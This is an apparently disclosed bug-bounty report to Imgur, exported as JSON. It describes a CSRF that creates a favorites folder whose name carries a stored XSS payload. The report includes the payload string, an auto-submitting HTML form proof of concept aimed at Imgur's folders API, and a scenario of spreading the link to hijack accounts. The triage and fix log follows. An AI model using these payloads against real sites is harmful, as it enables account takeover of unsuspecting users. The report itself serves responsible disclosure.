{"id":323005,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjMwMDU=","url":"https://hackerone.com/reports/323005","title":"CSRF leads to a stored self xss","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-03-06T23:34:16.814Z","submitted_at":"2018-03-06T23:34:16.814Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hogarth45","url":"/hogarth45","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-30T05:31:40.974Z","bug_reporter_agreed_on_going_public_at":"2019-07-31T05:31:39.675Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Followup from #311460\n\n#Summary\nSelf xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.\n\n#Description\nA favorites folder with an xss payload for a name will launch when saving an image to said folder.\n\nThis can be verified by following these steps\n* Visit your favorites\n* Create New Folder\n* Change name to\n```\n\"'\u003e\u003cimg src=x onerror=prompt(1)\u003e\n```\n* Save\n* Visit a photo\n* Click the little plus next to the heart on bottom left of image\n* Add to the folder\n* xss will launch\n\nSince self xss is out of scope, we will need a method of delivering this attack to a user.\nThis can be done via a CSRF to create a favorites folder.\n\n# POC\n\nUsing a form like so to create the CSRF:\n```\n\u003chtml\u003e\n\u003cbody onload='document.forms[0].submit()'\u003e\n  \u003cform method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'\u003e\n    \u003cinput name='name' value='New Test\"\u003e\u003cimg src=x onerror=prompt(2)\u003e'\u003e\n    \u003cinput name='is_private' value='false'\u003e\n  \u003c/form\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nOr be logged into your imgur account and visit\n\nhttp://blackdoorsec.net/sandbox/imgur2.html\n\nThis will create the folder with an xss name that can be used to attack an account.\n\n## Impact\n\naccount hijacking\nsince a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal\n\n#Scenerio\nsince reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.","vulnerability_information_html":"\u003cp\u003eFollowup from \u003ca href=\"/reports/311460\"\u003e#311460\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003cp\u003eSelf xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eA favorites folder with an xss payload for a name will launch when saving an image to said folder.\u003c/p\u003e\n\n\u003cp\u003eThis can be verified by following these steps\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eVisit your favorites\u003c/li\u003e\n\u003cli\u003eCreate New Folder\u003c/li\u003e\n\u003cli\u003eChange name to\n\u003ccode\u003e\n\u0026quot;\u0026#39;\u0026gt;\u0026lt;img src=x onerror=prompt(1)\u0026gt;\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eSave\u003c/li\u003e\n\u003cli\u003eVisit a photo\u003c/li\u003e\n\u003cli\u003eClick the little plus next to the heart on bottom left of image\u003c/li\u003e\n\u003cli\u003eAdd to the folder\u003c/li\u003e\n\u003cli\u003exss will launch\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSince self xss is out of scope, we will need a method of delivering this attack to a user.\u003cbr\u003e\nThis can be done via a CSRF to create a favorites folder.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\n\u003cp\u003eUsing a form like so to create the CSRF:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u003c/span\u003e \u003cspan class=\"na\"\u003eonload=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;document.forms[0].submit()\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eenctype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;https://api.imgur.com/3/folders\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;New Test\u0026quot;\u0026gt;\u0026lt;img src=x onerror=prompt(2)\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;is_private\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;false\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOr be logged into your imgur account and visit\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://blackdoorsec.net/sandbox/imgur2.html\" href=\"/redirect?url=http%3A%2F%2Fblackdoorsec.net%2Fsandbox%2Fimgur2.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blackdoorsec.net/sandbox/imgur2.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis will create the folder with an xss name that can be used to attack an account.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eaccount hijacking\u003cbr\u003e\nsince a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal\u003c/p\u003e\n\n\u003ch1 id=\"scenerio\"\u003eScenerio\u003c/h1\u003e\n\n\u003cp\u003esince reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-30T05:31:39.797Z","allow_singular_disclosure_after":-42077014.48090162,"singular_disclosure_allowed":true,"vote_count":140,"voters":["c1phy","monsieur_alpha","a_d_a_m","bl4de","mik317","egryan1","sameerphad72","dhakal_ananda","mygf","0-1","and 130 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2465655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!","markdown_message":"\u003cp\u003eHello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we\u0026#39;re a small team and sometimes it takes us a while to verify all reports. Please don\u0026#39;t ask for updates as these take time and effort away from the reports we\u0026#39;re working through and make our response time slower across the board. Thanks - we\u0026#39;ll be in touch soon!\u003c/p\u003e\n","automated_response":true,"created_at":"2018-03-06T23:34:17.753Z","updated_at":"2018-03-06T23:34:17.753Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2475253,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!","markdown_message":"\u003cp\u003eWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-08T22:45:11.632Z","updated_at":"2018-03-08T22:45:11.632Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3254821,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!","markdown_message":"\u003cp\u003eThe Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-27T19:57:23.732Z","updated_at":"2018-08-27T19:57:23.732Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"hogarth45","url":"/hogarth45"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5457265,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! ","markdown_message":"\u003cp\u003eWe have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-29T20:00:16.368Z","updated_at":"2019-07-29T20:00:16.368Z","actor":{"username":"kodermike","cleared":false,"url":"/kodermike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"hogarth45","url":"/hogarth45"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5467274,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-31T05:31:39.737Z","updated_at":"2019-07-31T05:31:39.737Z","first_to_agree":true,"actor":{"username":"hogarth45","cleared":true,"url":"/hogarth45","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5695527,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-30T05:31:40.995Z","updated_at":"2019-08-30T05:31:40.995Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}